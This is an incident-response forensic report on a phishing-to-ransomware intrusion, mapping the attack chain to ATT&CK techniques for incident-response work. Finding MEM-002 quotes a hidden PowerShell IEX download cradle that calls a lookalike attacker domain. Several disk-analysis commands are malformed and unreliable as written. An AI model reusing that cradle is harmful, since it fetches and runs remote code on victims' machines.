# Forensic Findings: IR-2026-0420-01

Classification: Incident evidence Analysis status: Pending access to actual forensic artifacts.

> Evidence limitation: The supplied Sysmon, proxy, and file-server samples are schema references only. The actual memory image, disk image, full proxy logs, full Sysmon logs, and EVTX file were not provided for direct examination. Commands and outputs below distinguish supplied evidence from analysis that remains pending.

## ART-001 verification

- SHA-256 at analysis start: Not available; compute from `cs-ws-101.mem` and compare against the acquisition baseline.
- CoC entry updated: Pending verification.
- Acquisition context: Mike Torres captured memory at 19:38Z on 2026-04-20, before his 19:43:18Z call. The transcript confirms no hash was computed at acquisition.
- Integrity status: Unverified until the evidence file and a trustworthy baseline are available.

## Memory analysis: cs-ws-101.mem

### Finding MEM-001: Beacon process in memory

Command:

vol -f cs-ws-101.mem windows.pstree.PsTree

Relevant output: Actual Volatility output unavailable. The supplied Sysmon sample records this process chain:

- `WINWORD.EXE`, PID 4921
- `powershell.exe`, PID 6201, parent PID 4921
- `svchost32.exe`, PID 7318, parent PID 6201

Conclusion: The supplied telemetry supports suspected macro-driven PowerShell execution followed by execution of a binary masquerading as a Windows component. Memory confirmation remains pending.

ATT&CK: T1059.001 (PowerShell), T1036.005 (Match Legitimate Resource Name or Location).

Certainty: Probable.

### Finding MEM-002: PowerShell downloader invocation

Command:

vol -f cs-ws-101.mem windows.cmdline.CmdLine

Relevant output: Actual plugin output unavailable. The supplied Sysmon sample records:

powershell.exe -NoProfile -WindowStyle Hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('[https://staging.office365-cdn.net/updates/inv\_payload.ps1](<https://staging.office365-cdn.net/updates/inv_payload.ps1?utm_source=chatgpt.com>)')"

Conclusion: Telemetry indicates a hidden PowerShell downloader retrieving a script from a suspicious lookalike domain. Memory-based confirmation remains pending.

ATT&CK: T1059.001, T1105 (Ingress Tool Transfer).

Certainty: Probable.

### Finding MEM-003: Active C2 connection

Command:

vol -f cs-ws-101.mem windows.netscan.NetScan

Relevant output: Actual plugin output unavailable. The supplied proxy sample records connections to `45.152.66.114:443` using `staging.office365-cdn.net`.

Conclusion: Historical C2 activity is supported by the supplied telemetry. An active connection at the 19:38Z memory-capture time must be confirmed from the memory image.

ATT&CK: T1071.001 (Web Protocols).

Certainty: Probable for historical C2; unverified for an active connection at capture.

### Finding MEM-004: Injected memory regions

Command:

vol -f cs-ws-101.mem windows.malfind.Malfind

Relevant output: Not available.

Conclusion: No conclusion about injected memory regions can be made without plugin output and examination of suspicious regions.

ATT&CK: T1055 (Process Injection), if confirmed.

Certainty: Possible.

### Finding MEM-005: NTLM hashes in memory

Command:

vol -f cs-ws-101.mem windows.hashdump.Hashdump

Relevant output: Not available.

Conclusion: The incident narrative states that NTLM credential material was used for lateral movement, but the contents of this memory image have not been verified.

ATT&CK: T1003.001 (LSASS Memory), if supported by actual evidence.

Certainty: Possible.

## Disk analysis: cs-ws-101.dd

### Finding DISK-001: Partition layout and filesystem metadata

Commands:

mmls cs-ws-101.dd fsstat -o cs-ws-101.dd

Relevant output: Not available.

Conclusion: Partition offsets, filesystem type, and metadata require examination of the actual disk image.

Certainty: Pending.

### Finding DISK-002: File timeline

Commands:

fls -r -o cs-ws-101.dd fls -r -m / -ocs-ws-101.dd \> bodyfile.txt mactime -b bodyfile.txt -d \> timeline.csv

Relevant output: Not available.

Conclusion: Review AppData, Temp, Windows Tasks, and relevant system directories. No filesystem timeline findings are confirmed.

Certainty: Pending.

### Finding DISK-003: Malicious document and payload extraction

Commands:

fls -r -o cs-ws-101.dd icat -o cs-ws-101.dd \> Invoice\_Q4\_2025.docm sha256sum Invoice\_Q4\_2025.docm

Repeat extraction and hashing for the downloader script and suspected beacon DLL after locating their actual filesystem entries.

Relevant output: Not available. The supplied telemetry identifies `Invoice_Q4_2025.docm`, the downloader URL, and `C:\ProgramData\Microsoft\svchost32.exe` as candidate artifacts.

Conclusion: Candidate artifacts are identified, but recovery, hashes, and contents have not been verified.

ATT&CK: T1566.001 (Spearphishing Attachment), T1105 (Ingress Tool Transfer).

Certainty: Probable for the delivery chain; pending for extracted files.

## Proxy log analysis: proxy\_72h.jsonl

### Finding PROXY-001: Initial phishing document access

Command:

jq -c 'select(.host=="CS-WS-101" and (.filename?=="Invoice\_Q4\_2025.docm"))' proxy\_72h.jsonl

Relevant output: The supplied sample records a successful document download at `2026-04-17T14:18:02Z`.

Conclusion: The sample indicates a macro-enabled Word document download. The full proxy log must validate the event.

ATT&CK: T1566.001.

Certainty: Probable.

### Finding PROXY-002: First C2 connection and beacon pattern

Command:

jq -c 'select(.url? | strings | contains("staging.office365-cdn.net"))' proxy\_72h.jsonl

Relevant output: The supplied sample records a script download at `2026-04-17T14:22:19Z`, followed by a connection to `45.152.66.114:443` at `14:23:07Z`. Subsequent entries describe recurring connections with a `sleep_60s_jitter_10pct` pattern.

Conclusion: The sample supports initial C2 activity and recurring beacon communications. Exact frequency and continuity require the complete log.

ATT&CK: T1071.001, T1105.

Certainty: Probable.

### Finding PROXY-003: Potential data staging or exfiltration

Command:

jq -c 'select(.host=="FILE-SVR-01" and (.bytes // 0) \> 1000000)' proxy\_72h.jsonl

Relevant output: The supplied sample records a 2,400,412-byte exchange to `45.152.66.114` at `2026-04-19T02:14:22Z`.

Conclusion: The large outbound exchange coincides with the file-server compromise window. Its contents are unknown, so this event alone does not prove PHI exfiltration.

ATT&CK: T1041 (Exfiltration Over C2 Channel), if corroborated.

Certainty: Possible for exfiltration; probable for suspicious outbound transfer.

## Sysmon analysis: sysmon\_multihost.jsonl

### Finding SYSMON-001: Lateral movement and service installation

Command:

jq -c 'select(.event\_type=="process\_create" or .event\_type=="registry\_set") | select((.cmdline? // "" | contains("WinHealthSvc")) or (.target\_object? // "" | contains("WinHealthSvc")))' sysmon\_multihost.jsonl

Relevant output: The supplied sample records `WinHealthSvc` service creation on `CS-WS-104` at `2026-04-19T00:03:44Z` and its ImagePath registry setting on `CS-WS-101` at `2026-04-17T14:23:28Z`. Connections from `CS-WS-104`, `CS-WS-107`, and `CS-WS-112` to the same external IP are also shown.

Conclusion: The sample supports propagation across multiple hosts and service-based persistence. The requested NTLM authentication events are not present in the supplied sample; validate authentication methods using actual authentication and endpoint logs.

ATT&CK: T1543.003 (Windows Service), T1021 (Remote Services), subject to validation.

Certainty: Probable.

### Finding SYSMON-002: Ransomware staging

Command:

jq -c 'select(.event\_type=="file\_create" and (.target? // "" | test("encryption\_staging\\\\.(ps1|bat)$"; "i")))' sysmon\_multihost.jsonl

Relevant output: The supplied sample records `encryption_staging.ps1` creation on `CS-WS-101`, `CS-WS-104`, `CS-WS-107`, and `CS-WS-112` between `2026-04-20T14:23:18Z` and `14:26:14Z`.

Conclusion: The sample indicates ransomware preparation across four workstations. Script creation does not prove encryption has executed.

ATT&CK: T1059.001 (PowerShell). T1486 (Data Encrypted for Impact) only if encryption is confirmed.

Certainty: Probable for staging; not established for encryption execution.

## File server analysis: fileserver\_access.evtx

### Finding FILE-001: Patient-document access window

Command:

evtx\_dump -o json fileserver\_access.evtx

Relevant output: The supplied schema reference reports 1,847 Event ID 4663 read-access events between `2026-04-19T02:14:01Z` and `02:41:12Z`, involving PDFs in `\clinical\labs\` and `\clinical\notes\`.

Conclusion: The supplied summary indicates access to 1,847 patient-document files during a 27-minute window. The complete EVTX is required to validate the count and categorize every record by path and timestamp.

ATT&CK: T1213 (Data from Information Repositories), subject to confirmation of the collection method.

Certainty: Probable.

### Finding FILE-002: Account used for access

Command:

evtx\_dump -o json fileserver\_access.evtx

Relevant output: The supplied summary identifies `MEDDEFENSE\jdoe`, logon ID `0xAF12C4B8`, with a network logon from `10.30.12.101` at `2026-04-19T02:14:00.842Z`. The sample attributes the file-access events to the same account.

Conclusion: The supplied summary attributes the sampled file access to `MEDDEFENSE\jdoe`, a scheduling coordinator reportedly without legitimate need to access these clinical shares. Correlate authentication and endpoint evidence before final attribution.

ATT&CK: T1078 (Valid Accounts).

Certainty: Probable.

## Attack chain summary

| Stage | Time range (UTC) | ATT&CK technique | Affected hosts | Evidence source | Certainty |
| --- | --- | --- | --- | --- | --- |
| Phishing document delivery | 2026-04-17 14:18Z | T1566.001 | CS-WS-101 | Supplied proxy sample | Probable |
| PowerShell downloader | 2026-04-17 14:22Z | T1059.001, T1105 | CS-WS-101 | Supplied Sysmon and proxy samples | Probable |
| Beacon execution and persistence | 2026-04-17 14:23Z onward | T1071.001, T1543.003 | CS-WS-101 | Supplied Sysmon and proxy samples | Probable |
| Credential access | 2026-04-17 14:25Z onward | T1003.001, if verified | CS-WS-101 | Supplied Sysmon sample | Possible |
| Lateral movement | 2026-04-19 00:03Z–00:18Z | T1021, subject to validation | CS-WS-104, CS-WS-107, CS-WS-112 | Supplied Sysmon and proxy samples | Probable |
| Clinical file-server access | 2026-04-19 02:14Z–02:41Z | T1213, subject to validation | FILE-SVR-01 | Supplied file-access summary | Probable |
| Suspicious outbound transfer | 2026-04-19 02:14Z | T1041, if corroborated | FILE-SVR-01 | Supplied proxy sample | Possible |
| Ransomware staging | 2026-04-20 14:23Z–14:26Z | T1059.001; T1486 not yet established | CS-WS-101, CS-WS-104, CS-WS-107, CS-WS-112 | Supplied Sysmon sample | Probable |
| Scheduling-server compromise | 2026-04-20 18:02Z | Technique pending further validation | SCHED-SVR-01 | Supplied Sysmon sample and incident transcript | Probable |